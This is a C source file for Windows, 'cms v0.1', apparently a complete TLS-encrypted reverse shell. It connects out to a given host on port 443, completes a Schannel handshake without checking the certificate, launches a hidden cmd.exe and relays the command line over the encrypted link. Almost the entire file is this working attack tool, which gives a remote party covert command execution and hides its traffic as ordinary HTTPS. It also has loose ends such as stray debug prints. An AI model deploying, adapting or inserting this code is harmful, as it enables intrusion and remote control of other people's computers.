/**
 * Copyright 2015 Odzhan
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, 
 * MA  02111-1307 USA
 * 
 * http://www.gnu.org/licenses/gpl-2.0.txt
 * 
 */

#define SECURITY_WIN32

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#include <ws2tcpip.h>
#include <winsock2.h>
#include <windows.h>
#include <wincrypt.h>
#include <shlwapi.h>

#include <wintrust.h>
#include <schannel.h>
#include <security.h>
#include <sspi.h>

#pragma comment(lib, "WS2_32.Lib")
#pragma comment(lib, "Crypt32.Lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shlwapi.lib")

PBYTE                  pbBufferIn, pbBufferOut;
PBYTE                  pbDataIn, pbDataOut;
DWORD                  cbDataIn, cbDataOut;

DWORD                  cbBufferLen, timeout=1000*5;
SCHANNEL_CRED          SchannelCred;
PSecurityFunctionTable sspi;
SECURITY_STATUS        ss;
TimeStamp              ts;

CredHandle hClientCreds;
CtxtHandle hContext;

struct sockaddr_in sin;
struct hostent     *hp;
WSADATA            wsa;

#define DEFAULT_PORT "443"

typedef struct _CMD_ARGS {
  char   *port;           // port number as string
  int    port_nbr;        // port number as integer
  char   *address;        // local or remote address as IP or host name
  int    secure;          // security is enabled by default but can be switched off with -s
  int    ai_family;       // AF_INET or AF_INET6
} CMD_ARGS;

DWORD       dwProtocol = SP_PROT_TLS1; // SP_PROT_TLS1; // SP_PROT_PCT1; SP_PROT_SSL2; SP_PROT_SSL3; 0=default
ALG_ID      aiKeyExch  = 0; // = default; CALG_DH_EPHEM; CALG_RSA_KEYX;
CredHandle  hClientCreds;
LPSTR       pszUser;
LPSTR       pszServer;
LPSTR       pszPort;

SecPkgContext_StreamSizes Sizes;

HANDLE      evt[MAXIMUM_WAIT_OBJECTS];
DWORD       len, publen, evt_cnt=0, sck_evt, ctrl_evt, stdin_evt, stdout_evt, proc_evt, last_pkt_err;
SOCKET      s, r;
BYTE        ip[64];

CMD_ARGS    args;

struct sockaddr_in sin_ipv4;
struct sockaddr_in6 sin_ipv6;

int ai_addrlen;
struct sockaddr *ai_addr;

// display windows error message
void xstrerror (char *fmt, ...) {
  char    *error=NULL;
  va_list arglist;
  char    buffer[2048];
  DWORD   dwError=GetLastError();
  
  va_start (arglist, fmt);
  wvnsprintf (buffer, sizeof(buffer) - 1, fmt, arglist);
  va_end (arglist);
  
  if (FormatMessage (
      FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
      NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
      (LPSTR)&error, 0, NULL))
  {
    printf ("  [ %s : %s\n", buffer, error);
    LocalFree (error);
  } else {
    printf ("  [ %s : %i\n", buffer, dwError);
  }
}

// encrypt and send data to remote system
SECURITY_STATUS ssl_send (void)
{
  SecBufferDesc  msg;
  SecBuffer      sb[4];
  
  // stream header
  sb[0].pvBuffer   = pbBufferOut; 
  sb[0].cbBuffer   = Sizes.cbHeader; 
  sb[0].BufferType = SECBUFFER_STREAM_HEADER;

  // stream data
  sb[1].pvBuffer   = pbBufferOut + Sizes.cbHeader;
  sb[1].cbBuffer   = cbDataOut; 
  sb[1].BufferType = SECBUFFER_DATA; 
  
  // stream trailer
  sb[2].pvBuffer   = pbBufferOut + Sizes.cbHeader + cbDataOut; 
  sb[2].cbBuffer   = Sizes.cbTrailer; 
  sb[2].BufferType = SECBUFFER_STREAM_TRAILER; 

  sb[3].pvBuffer   = SECBUFFER_EMPTY; 
  sb[3].cbBuffer   = SECBUFFER_EMPTY; 
  sb[3].BufferType = SECBUFFER_EMPTY;

  msg.ulVersion    = SECBUFFER_VERSION; 
  msg.cBuffers     = 4;
  msg.pBuffers     = sb; 
  
  // encrypt
  ss = sspi->EncryptMessage (&hContext, 0, &msg, 0);
  
  // send
  if (ss==SEC_E_OK) {
    send (s, pbBufferOut, sb[0].cbBuffer + sb[1].cbBuffer + sb[2].cbBuffer, 0);
  }
  return ss;
}

SECURITY_STATUS ssl_recv (void)
{
  SecBufferDesc  msg;
  SecBuffer      sb[4];
  DWORD          cbIoBuffer=0;
  SecBuffer      *pData=NULL, *pExtra=NULL;
  int            len, i;
  ss=SEC_E_INCOMPLETE_MESSAGE;
  
  do
  {
    if (cbIoBuffer==0 || ss==SEC_E_INCOMPLETE_MESSAGE)
    {
      len = recv (s, pbDataIn + cbIoBuffer, cbBufferLen - cbIoBuffer, 0);
      if (len<=0) break;
      
      cbIoBuffer += len;
      
      sb[0].pvBuffer   = pbDataIn;
      sb[0].cbBuffer   = cbIoBuffer;
    
      sb[0].BufferType = SECBUFFER_DATA;
      sb[1].BufferType = SECBUFFER_EMPTY;
      sb[2].BufferType = SECBUFFER_EMPTY;
      sb[3].BufferType = SECBUFFER_EMPTY;

      msg.ulVersion    = SECBUFFER_VERSION;
      msg.cBuffers     = 4;
      msg.pBuffers     = sb;
    
      ss = sspi->DecryptMessage (&hContext, &msg, 0, NULL);
    
      if (ss == SEC_I_CONTEXT_EXPIRED) break;
    
      for (i=0; i<4; i++) {
        if (pData==NULL && sb[i].BufferType==SECBUFFER_DATA) pData=&sb[i];
        if (pExtra==NULL && sb[i].BufferType==SECBUFFER_EXTRA) pExtra=&sb[i];
      }
      
      if (pData!=NULL)
      {
        cbDataIn=pData->cbBuffer;
        if (cbDataIn!=0)
        {
          memcpy (pbDataIn, pData->pvBuffer, cbDataIn);
          break;
        }
      }
    }
  } while (1);
  return SEC_E_OK;
}

// create credentials
SECURITY_STATUS create_creds (void)   
{
  DWORD  cSupportedAlgs = 0;
  ALG_ID rgbSupportedAlgs[16];
  
  ZeroMemory (&SchannelCred, sizeof (SchannelCred));

  SchannelCred.dwVersion             = SCHANNEL_CRED_VERSION;
  SchannelCred.grbitEnabledProtocols = SP_PROT_SSL3 | SP_PROT_TLS1;

  if (aiKeyExch) { 
    rgbSupportedAlgs[cSupportedAlgs++] = aiKeyExch;
  }
  
  if (cSupportedAlgs) {
    SchannelCred.cSupportedAlgs    = cSupportedAlgs;
    SchannelCred.palgSupportedAlgs = rgbSupportedAlgs;
  }

  SchannelCred.dwFlags |= SCH_CRED_NO_DEFAULT_CREDS;
  // We need manual validation
  SchannelCred.dwFlags |= SCH_CRED_MANUAL_CRED_VALIDATION;
  
  ss = sspi->AcquireCredentialsHandleA (NULL, UNISP_NAME_A, 
            SECPKG_CRED_OUTBOUND, NULL, &SchannelCred, NULL, 
            NULL, &hClientCreds, &ts);
  return ss;
}

// Initiate a ClientHello message and generate a token.
SECURITY_STATUS chs_hello (void)
{
  DWORD         dwFlagsIn, dwFlagsOut;
  SecBuffer     sb[1];
  SecBufferDesc hs;
  
  dwFlagsIn = ISC_REQ_SEQUENCE_DETECT | 
              ISC_REQ_REPLAY_DETECT   | 
              ISC_REQ_CONFIDENTIALITY | 
              ISC_RET_EXTENDED_ERROR  | 
              ISC_REQ_ALLOCATE_MEMORY | 
              ISC_REQ_STREAM;

  sb[0].pvBuffer   = NULL;
  sb[0].BufferType = SECBUFFER_TOKEN;
  sb[0].cbBuffer   = 0;

  hs.cBuffers      = 1;
  hs.pBuffers      = sb;
  hs.ulVersion     = SECBUFFER_VERSION;

  ss = sspi->InitializeSecurityContextA (&hClientCreds, NULL, pszServer, dwFlagsIn, 
              0, SECURITY_NATIVE_DREP, NULL, 0, &hContext, &hs, &dwFlagsOut, &ts);

  // should indicate continuing
  if (ss==SEC_I_CONTINUE_NEEDED) {
    // send data
    if (sb[0].cbBuffer != 0) {
      send (s, sb[0].pvBuffer, sb[0].cbBuffer, 0);
      ss = sspi->FreeContextBuffer (sb[0].pvBuffer);
    }
  }
  return ss;
}

// perform SSL handshake with remote system
SECURITY_STATUS chs (void)
{
  DWORD         dwFlagsIn, dwFlagsOut;
  SecBuffer     ib[2], ob[1];
  SecBufferDesc in, out;
  DWORD         cbIoBuffer=0;
  PBYTE         IoBuffer;
  int           len;
  BOOL          bRead=TRUE;
  
  // 8192 should be enough for handshake but
  // if you see any errors, try increasing it.
  IoBuffer = LocalAlloc (LMEM_FIXED, 8192);
  
  if ((ss=chs_hello())!=SEC_E_OK) {
    return ss;
  }
  
  dwFlagsIn = ISC_REQ_SEQUENCE_DETECT | 
              ISC_REQ_REPLAY_DETECT   | 
              ISC_REQ_CONFIDENTIALITY |
              ISC_RET_EXTENDED_ERROR  | 
              ISC_REQ_ALLOCATE_MEMORY | 
              ISC_REQ_STREAM;

  ss=SEC_I_CONTINUE_NEEDED;
  
  while (ss==SEC_I_CONTINUE_NEEDED || ss==SEC_E_INCOMPLETE_MESSAGE)
  {
    if (ss==SEC_E_INCOMPLETE_MESSAGE || cbIoBuffer==0)
    {
      if (bRead)
      {
        len=recv (s, &IoBuffer[cbIoBuffer], 8192, 0);
      
        // some socket error
        if (len<=0) {
          break;
        }
        cbIoBuffer += len;
      } else {
        bRead=TRUE;
      }
    }
    
    ib[0].pvBuffer   = IoBuffer;
    ib[0].cbBuffer   = cbIoBuffer;
    ib[0].BufferType = SECBUFFER_TOKEN;

    ib[1].pvBuffer   = NULL;
    ib[1].cbBuffer   = 0;
    ib[1].BufferType = SECBUFFER_EMPTY;

    in.cBuffers      = 2;
    in.pBuffers      = ib;
    in.ulVersion     = SECBUFFER_VERSION;

    ob[0].pvBuffer   = NULL;
    ob[0].BufferType = SECBUFFER_TOKEN;
    ob[0].cbBuffer   = 0;

    out.cBuffers     = 1;
    out.pBuffers     = ob;
    out.ulVersion    = SECBUFFER_VERSION;

    ss = sspi->InitializeSecurityContextA (&hClientCreds, &hContext, 
      NULL, dwFlagsIn, 0, SECURITY_NATIVE_DREP, &in, 0, NULL, 
      &out, &dwFlagsOut, &ts);
    
    // might get SEC_E_ILLEGAL_MESSAGE here
    
    if (ss==SEC_E_OK || 
        ss==SEC_I_CONTINUE_NEEDED ||
        FAILED (ss) && (dwFlagsOut & ISC_RET_EXTENDED_ERROR))
    {
      if (ob[0].cbBuffer != 0) {
        len=send (s, ob[0].pvBuffer, ob[0].cbBuffer, 0);
      
        // socket error
        if (len<=0) {
          break;
        }
      
        sspi->FreeContextBuffer (ob[0].pvBuffer);
      }
    }
    
    if (ss==SEC_E_INCOMPLETE_MESSAGE) continue;
    
    if (ss==SEC_E_OK) {
      if (ib[1].BufferType==SECBUFFER_EXTRA) {
        // i don't handle extra data here but it should be.
      }
      break;
    }      
    // Copy any leftover data from the "extra" buffer, and go around again.
    if ( ib[1].BufferType == SECBUFFER_EXTRA )
    {
      MoveMemory (IoBuffer, &IoBuffer[cbIoBuffer - ib[1].cbBuffer], ib[1].cbBuffer);
      cbIoBuffer = ib[1].cbBuffer;
    }
    else
    cbIoBuffer = 0;
  }
  LocalFree (IoBuffer);
  return ss;
}

// convert binary network address to string
char *addr2ip (void)
{
  DWORD ip_size=64;
  WSAAddressToString (ai_addr, ai_addrlen, NULL, (char*)ip, &ip_size);
  return (char*)ip;
}

// sets the width of console buffer
VOID setw (SHORT X) {
  CONSOLE_SCREEN_BUFFER_INFO csbi;
  GetConsoleScreenBufferInfo (GetStdHandle(STD_OUTPUT_HANDLE), &csbi);
  
  if (X <= csbi.dwSize.X) return;
  csbi.dwSize.X = X;
  SetConsoleScreenBufferSize (GetStdHandle(STD_OUTPUT_HANDLE), csbi.dwSize);
}

// Resolve host, create socket and event handle associated with it 
BOOL open_tcp (void)
{
  struct addrinfo *list, *e;
  struct addrinfo hints;
  BOOL            bStatus=FALSE;
  WSADATA         wsa;
  int             on=1;
  
  WSAStartup (MAKEWORD (2, 0), &wsa);
  
  ZeroMemory (&hints, sizeof (hints));

  hints.ai_family   = args.ai_family;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_protocol = IPPROTO_TCP;
  
  // get all resolvable addresses for this machine name
  if (getaddrinfo (args.address, args.port, &hints, &list) == 0) 
  {
    for (e=list; e!=NULL; e=e->ai_next) 
    {
      if (args.ai_family==AF_INET) {
        memcpy (&sin_ipv4, e->ai_addr, e->ai_addrlen);
        ai_addr     = (SOCKADDR*)&sin_ipv4;        
      } else {
        memcpy (&sin_ipv6, e->ai_addr, e->ai_addrlen);
        ai_addr     = (SOCKADDR*)&sin_ipv6;
      }
      ai_addrlen = e->ai_addrlen;
      // create socket
      s=socket (args.ai_family, SOCK_STREAM, IPPROTO_TCP);
      evt[sck_evt = evt_cnt++] = WSACreateEvent();
      if (s!=SOCKET_ERROR) {
        // ensure we can reuse same port later
        setsockopt (s, SOL_SOCKET, SO_REUSEADDR, (char*)&on, sizeof (on));
        bStatus=TRUE;
      }
      break;
    }
    freeaddrinfo (list);
  } else {
    xstrerror ("getaddrinfo(%s)", args.address);
  }
  return bStatus;
}

SECURITY_STATUS ReadDecrypt (void)

// calls recv() - blocking socket read
// http://msdn.microsoft.com/en-us/library/ms740121(VS.85).aspx

// The encrypted message is decrypted in place, overwriting the original contents of its buffer.
// http://msdn.microsoft.com/en-us/library/aa375211(VS.85).aspx

{
  SecBuffer       ExtraBuffer;
  SecBuffer       *pDataBuffer, *pExtraBuffer;

  SECURITY_STATUS scRet;            // unsigned long cbBuffer;    // Size of the buffer, in bytes
  SecBufferDesc   Message;        // unsigned long BufferType;  // Type of the buffer (below)
  SecBuffer       Buffers[4];    // void    SEC_FAR * pvBuffer;   // Pointer to the buffer

  DWORD           cbIoBuffer, cbData, length;
  PBYTE           buff;
  int             i;

  // Read data from server until done.
  cbIoBuffer = 0;
  scRet = 0;
  
  while(TRUE) // Read some data.
  {
    if( cbIoBuffer == 0 || scRet == SEC_E_INCOMPLETE_MESSAGE ) // get the data
    {
      cbDataIn = recv(s, pbBufferIn + cbIoBuffer, cbBufferLen - cbIoBuffer, 0);
      if(cbDataIn == SOCKET_ERROR)
      {
        printf("**** Error %d reading data from server\n", WSAGetLastError());
        scRet = SEC_E_INTERNAL_ERROR;
        break;
      }
      else if(cbDataIn == 0) // Server disconnected.
      {
        if(cbIoBuffer)
        {
          printf("**** Server unexpectedly disconnected\n");
          scRet = SEC_E_INTERNAL_ERROR;
          return scRet;
        }
        else
        break; // All Done
      }
      else // success
      {
        cbIoBuffer += cbDataIn;
      }
    }

    // Decrypt the received data.
    Buffers[0].pvBuffer     = pbBufferIn;
    Buffers[0].cbBuffer     = cbIoBuffer;
    Buffers[0].BufferType   = SECBUFFER_DATA;  // Initial Type of the buffer 1
    Buffers[1].BufferType   = SECBUFFER_EMPTY; // Initial Type of the buffer 2
    Buffers[2].BufferType   = SECBUFFER_EMPTY; // Initial Type of the buffer 3
    Buffers[3].BufferType   = SECBUFFER_EMPTY; // Initial Type of the buffer 4

    Message.ulVersion       = SECBUFFER_VERSION;    // Version number
    Message.cBuffers        = 4;                                    // Number of buffers - must contain four SecBuffer structures.
    Message.pBuffers        = Buffers;                        // Pointer to array of buffers
    
    scRet = sspi->DecryptMessage(&hContext, &Message, 0, NULL);
    
    if( scRet == SEC_I_CONTEXT_EXPIRED ) break; // Server signalled end of session
    
    //      if( scRet == SEC_E_INCOMPLETE_MESSAGE - Input buffer has partial encrypted record, read more
    if( scRet != SEC_E_OK &&
        scRet != SEC_I_RENEGOTIATE &&
        scRet != SEC_I_CONTEXT_EXPIRED )
    { printf("**** DecryptMessage ");
      return scRet; }

    // Locate data and (optional) extra buffers.
    pDataBuffer  = NULL;
    pExtraBuffer = NULL;
    
    for(i = 1; i < 4; i++)
    {
      if( pDataBuffer  == NULL && Buffers[i].BufferType == SECBUFFER_DATA  ) pDataBuffer  = &Buffers[i];
      if( pExtraBuffer == NULL && Buffers[i].BufferType == SECBUFFER_EXTRA ) pExtraBuffer = &Buffers[i];
    }

    if (pDataBuffer!=NULL)
    {
      cbDataIn=pDataBuffer->cbBuffer;
      if (cbDataIn!=0)
      {
        memcpy (pbDataIn, pDataBuffer->pvBuffer, cbDataIn);
      }
    }
      
    // Move any "extra" data to the input buffer.
    if(pExtraBuffer)
    {
      printf ("extra");
      MoveMemory(pbBufferIn, pExtraBuffer->pvBuffer, pExtraBuffer->cbBuffer);
      cbIoBuffer = pExtraBuffer->cbBuffer; // printf("cbIoBuffer= %d  \n", cbIoBuffer);
    }
    else
    cbIoBuffer = 0;
  printf ("\nhello");
  }

  return SEC_E_OK;
}

// shut down socket, close event handle, clean up
void close_tcp (void)
{
  // disable send/receive operations
  shutdown (s, SD_BOTH);
  // close socket
  closesocket (s);
  // clean up
  WSACleanup();
}

BOOL WINAPI HandlerRoutine (DWORD dwCtrlType)
{
  if (dwCtrlType != CTRL_C_EVENT) return FALSE;
  SetEvent (evt[ctrl_evt]);
  return TRUE;
}

// create handler for CTRL+C event
void start_handler (void)
{
  evt[ctrl_evt = evt_cnt++] = CreateEvent (NULL, FALSE, FALSE, NULL);
  SetConsoleCtrlHandler (HandlerRoutine, TRUE);
}

// remove handler for CTRL+C
void stop_handler (void)
{
  SetConsoleCtrlHandler (HandlerRoutine, FALSE);
  CloseHandle (evt[ctrl_evt]);
  evt_cnt--;
}

typedef struct _ALG_INFO {
  ALG_ID id;
  char *s;
} ALG_INFO;

ALG_INFO algos[]=
{
  // protocols
  {SP_PROT_TLS1_CLIENT, "TLS1"},
  {SP_PROT_PCT1_CLIENT, "PCT1"},
  {SP_PROT_SSL2_CLIENT, "SSL2"},
  {SP_PROT_SSL3_CLIENT, "SSL3"},
  // ciphers
  {CALG_RC2,     "RC2"        },
  {CALG_RC4,     "RC4"        },
  {CALG_DES,     "DES"        },
  {CALG_3DES,   "3DES"        },
  {CALG_AES_128, "AES"        },
  {CALG_AES_192, "AES"        },
  {CALG_AES_256, "AES"        },
  // hash
  {CALG_MD5,      "MD5"       },
  {CALG_SHA,      "SHA"       },
  // key exchange
  {CALG_RSA_KEYX, "RSA"       },
  {CALG_DH_EPHEM, "DHE"       },
  {CALG_ECDH,     "ECDH"      },
  {CALG_ECMQV,    "ECMQV"     },
};

char *alg2s (ALG_ID id)
{
  int i;
  for (i=0; i<sizeof(algos)/sizeof(ALG_INFO);i++) {
    if (algos[i].id==id)
      return algos[i].s;
  }
  return "unrecognized";
}

void secure_info (void)
{
  SecPkgContext_ConnectionInfo ci;

  ss = sspi->QueryContextAttributes (&hContext, SECPKG_ATTR_CONNECTION_INFO, (PVOID)&ci);
  if(ss != SEC_E_OK) { printf("Error 0x%x querying connection info\n", ss); return; }

  printf ("  [ Protocol : %s\n",      alg2s(ci.dwProtocol));
  printf ("  [ Cipher   : %s-%i\n",   alg2s(ci.aiCipher), ci.dwCipherStrength);
  printf ("  [ Hash     : %s-%i\n",   alg2s(ci.aiHash),   ci.dwHashStrength  );
  printf ("  [ Exchange : %s-%i\n\n", alg2s(ci.aiExch),   ci.dwExchStrength  );
}

DWORD wait_evt (void)
{
  WSANETWORKEVENTS ne;
  u_long           off=0;
  DWORD            e;
  
  // unblock socket
  WSAEventSelect (s, evt[sck_evt], FD_CLOSE | FD_READ | FD_ACCEPT);
  
  // wait for some event
  e=WaitForMultipleObjects (evt_cnt, evt, FALSE, timeout);

  WSAEnumNetworkEvents (s, evt[sck_evt], &ne);    
  WSAEventSelect (s, evt[sck_evt], 0);
  
  // block socket
  ioctlsocket (s, FIONBIO, &off);
  
  if (ne.lNetworkEvents & FD_CLOSE) {
    e=-1;
  }
  return e;
}

#define R_PIPE 0
#define W_PIPE 1

void cmd (void) 
{
  SECURITY_ATTRIBUTES sa;
  PROCESS_INFORMATION pi;
  STARTUPINFO         si;
  OVERLAPPED          lap;
  
  HANDLE              in[2], out[2];
  DWORD               p, e;
  
  sa.nLength              = sizeof (SECURITY_ATTRIBUTES);
  sa.lpSecurityDescriptor = NULL;
  sa.bInheritHandle       = TRUE;
  
  evt[stdout_evt = evt_cnt++] = CreateEvent (NULL, TRUE, TRUE, NULL);
  
  if (CreatePipe (&in[R_PIPE], &in[W_PIPE], &sa, 0)) 
  {  
    out[R_PIPE] = CreateNamedPipe ("\\\\.\\pipe\\0", 
        PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE      | PIPE_READMODE_BYTE | PIPE_WAIT, 
        PIPE_UNLIMITED_INSTANCES, 0, 0, 0, &sa);
        
    if (out[R_PIPE] != INVALID_HANDLE_VALUE) 
    {  
      out[W_PIPE] = CreateFile ("\\\\.\\pipe\\0", GENERIC_WRITE, 
          0, &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
      
      if (out[W_PIPE] != INVALID_HANDLE_VALUE) 
      {
        ZeroMemory (&si, sizeof (si));
        ZeroMemory (&pi, sizeof (pi));

        SetHandleInformation (in[W_PIPE], HANDLE_FLAG_INHERIT, 0);
        SetHandleInformation (out[R_PIPE], HANDLE_FLAG_INHERIT, 0);
        
        si.cb              = sizeof (si);
        si.hStdInput       = in[R_PIPE];
        si.hStdError       = out[W_PIPE];
        si.hStdOutput      = out[W_PIPE];
        si.dwFlags         = STARTF_USESTDHANDLES;
        
        if (CreateProcess (NULL, "cmd", NULL, NULL, TRUE, 
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) 
        {
          evt[proc_evt = evt_cnt++] = pi.hProcess;
          
          ZeroMemory (&lap, sizeof (lap));       
          lap.hEvent = evt[stdout_evt];
          
          p=0;
          
          do 
          {
            e=wait_evt();

            if (e==ctrl_evt) {
              printf ("  [ CTRL+C received\n");
              break;
            }
            if (e==proc_evt) {
              printf ("  [ cmd.exe terminated\n");
              break;
            }
            
            if (e == -1) break;

            // is this socket event?
            if (e == sck_evt) 
            {
              if (ReadDecrypt () != SEC_E_OK) 
                break;
              
              WriteFile (in[W_PIPE], pbDataIn, cbDataIn, &cbDataIn, 0);
              p--;  // we're ready to read again.              
            } else
           
            // data from cmd.exe?
            if (e == stdout_evt) 
            {
              if (p==0)  // still waiting for previous read to complete?
              {
                if (!ReadFile (out[R_PIPE], pbDataOut, cbBufferLen, &cbDataOut, &lap))
                {
                  if (GetLastError() != ERROR_IO_PENDING)
                  {
                    // problem...
                    break;
                  } else {
                    p++;
                  }
                } else {
                  p++;
                }
              } else {
                if (!GetOverlappedResult (out[R_PIPE], &lap, &cbDataOut, FALSE)) {
                  // problem...
                  break;
                }
                if (cbDataOut != 0)
                {
                  if (ssl_send() != SEC_E_OK) 
                    break;
                  p--;
                }
              }
            }
          } while (1);
          
          TerminateProcess (pi.hProcess, 0);
          
          CloseHandle (pi.hThread);
          CloseHandle (pi.hProcess);
          evt_cnt--;
        }
        CloseHandle (out[W_PIPE]);
      }
      CloseHandle (out[R_PIPE]);
    }
    CloseHandle (in[W_PIPE]);
    CloseHandle (in[R_PIPE]);
  }
  CloseHandle (evt[stdout_evt]);
  evt_cnt--;
}

char* getparam (int argc, char *argv[], int *i)
{
  int n=*i;
  if (argv[n][2] != 0) {
    return &argv[n][2];
  }
  if ((n+1) < argc) {
    *i=n+1;
    return argv[n+1];
  }
  printf ("  [ %c%c requires parameter\n", argv[n][0], argv[n][1]);
  exit (0);
}

void usage (void) 
{ 
  int i;
  
  printf ("\n  usage: cms <address> [options]\n");
  printf ("\n  -4           Use IP version 4 (default)");
  printf ("\n  -6           Use IP version 6");
  printf ("\n  -p <number>  Port number to use (default is 443)");
  printf ("\n\n  Press any key to continue . . .");
  getchar ();
  exit (0);
}

// parse the arguments on command line
void parse_args (int argc, char *argv[])
{
  int  i;
  char opt;
  
  // for each argument
  for (i=1; i<argc; i++)
  {
    // is this option?
    if (argv[i][0]=='-' || argv[i][1]=='/')
    {
      // get option value
      opt=argv[i][1];
      switch (opt)
      {
        case '4':
          args.ai_family=AF_INET;
          break;
        case '6':     // use ipv6 (default is ipv4)
          args.ai_family=AF_INET6;
          break;
        case 'p':     // port number
          args.port=getparam(argc, argv, &i);
          args.port_nbr=atoi(args.port);
          break;
        case '?':     // display usage
        case 'h':
          usage ();
          break;
        default:
          printf ("  [ unknown option %c\n", opt);
          break;
      }
    } else {
      // assume it's host name or IP
      args.address=argv[i];
    }
  }
}

int main (int argc, char *argv[])
{
  INIT_SECURITY_INTERFACE pInitSecurityInterface;
  
  // set buffer width of console
  setw (300);
  
  puts ("\n  [ cms v0.1 - Copyleft 2015 (x) @Odzhan\n");
  
  // set up default values
  args.address   = NULL;
  args.ai_family = AF_INET;
  args.port      = DEFAULT_PORT;
  args.port_nbr  = atoi(args.port);
  
  pInitSecurityInterface = (INIT_SECURITY_INTERFACE)GetProcAddress(LoadLibrary("Secur32"), "InitSecurityInterfaceA" );
  if (pInitSecurityInterface==NULL) printf ("didn't resolve");
  sspi = pInitSecurityInterface();
  
  // process command line
  parse_args(argc, argv);

  // resolve address and open socket
  if (open_tcp ()) 
  {
    start_handler ();
      
    // create credentials
    if (create_creds()==SEC_E_OK)
    {
      // connect to server
      if (connect (s, ai_addr, ai_addrlen) != SOCKET_ERROR) {
        // perform the handshake
        if (chs () == SEC_E_OK) {
          printf ("  [ connected\n\n");
          secure_info();
          ss=sspi->QueryContextAttributes (&hContext, SECPKG_ATTR_STREAM_SIZES, &Sizes );
          cbBufferLen  = Sizes.cbHeader  +  Sizes.cbMaximumMessage  +  Sizes.cbTrailer;
          pbBufferIn        = LocalAlloc(LMEM_FIXED, cbBufferLen);
          pbBufferOut       = LocalAlloc(LMEM_FIXED, cbBufferLen);
          pbDataIn=pbBufferIn + Sizes.cbHeader;
          pbDataOut=pbBufferOut + Sizes.cbHeader;
          cbBufferLen = Sizes.cbMaximumMessage;
          
          printf ("  [ running cmd\n");
          cmd();
            
        } else {
          printf ("  [ handshake failed\n");
        }
      } else {
        printf ("  [ unable to connect\n");
      }
    } else {
      printf ("  [ error creating credentials\n");
    }
    stop_handler ();
    close_tcp();
  }
  return 0;
}

